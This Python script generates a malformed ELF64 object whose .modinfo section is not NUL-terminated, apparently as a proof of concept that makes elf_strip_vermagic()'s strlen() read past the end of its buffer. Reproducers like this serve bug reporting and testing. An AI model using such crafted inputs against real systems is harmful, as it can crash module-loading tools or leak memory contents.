import struct, sys
# Minimal ELF64 LSB REL whose .modinfo section is NOT NUL-terminated and reaches end of file,
# so elf_strip_vermagic()'s strlen() reads past the buffer.
shstr = b"\x00.shstrtab\x00.modinfo\x00"
off_shstr = 64
off_shdrs = off_shstr + len(shstr)
SHDR = 64
off_modinfo = off_shdrs + 3*SHDR
modinfo = b"license=GPL"            # 11 bytes, no trailing NUL, at EOF
def shdr(name,typ,off,size):
    return struct.pack("<IIQQQQIIQQ", name,typ,0,0,off,size,0,0,1,0)
shdrs = shdr(0,0,0,0)                                   # NULL
shdrs += shdr(1,3,off_shstr,len(shstr))                 # .shstrtab (SHT_STRTAB)
shdrs += shdr(11,1,off_modinfo,len(modinfo))           # .modinfo (SHT_PROGBITS)
e_ident = b"\x7fELF" + bytes([2,1,1,0]) + b"\x00"*8
ehdr = e_ident + struct.pack("<HHIQQQIHHHHHH",
    1, 0x3e, 1, 0, 0, off_shdrs, 0, 64, 0, 0, SHDR, 3, 1)
data = ehdr + shstr + shdrs + modinfo
assert len(data)==off_modinfo+len(modinfo)
open(sys.argv[1],"wb").write(data)
print("wrote",sys.argv[1],len(data),"bytes; .modinfo at",off_modinfo,"size",len(modinfo))
